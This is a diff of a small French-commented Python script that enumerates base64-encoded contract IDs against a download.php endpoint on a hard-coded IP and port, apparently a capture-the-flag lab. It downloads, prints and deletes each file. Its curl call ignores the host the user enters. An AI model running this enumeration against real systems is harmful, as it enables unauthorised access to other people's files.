@@ -2,18 +2,19 @@ from urllib.parse import quote
 import base64
 import os
 
-url = input("Entréz : IP:PORT ") # Demande l'ip a l'utilisateur
+url = input("Entréz : IP:PORT ")
 
 for num in range (1,21): # boucle j'usqu'a 21
     num_base64 = base64.b64encode(str(num).encode()).decode() # encode en base 64
-    name = f"{quote(num_base64)}"                             # rédige le nom
+    name = f"{quote(num_base64)}" # crée le nom en URLencode
     print(name)
     print("")
     os.system(f'curl -X POST "http://167.172.54.11:31440/download.php?contract={name}" -o{name}')
-    print(f"http://167.172.54.11:31440/download.php?contract={name} ")
+    print(f"http://{url}/download.php?contract={name} ")
     print("")
-    os.system(f'cat {name}') # Affiche les fichiers
+    os.system(f'cat {name}')
     print("")
-    os.system(f'rm {name}') # supprime les fichiers
+    os.system(f'rm {name}')
 
  
+    
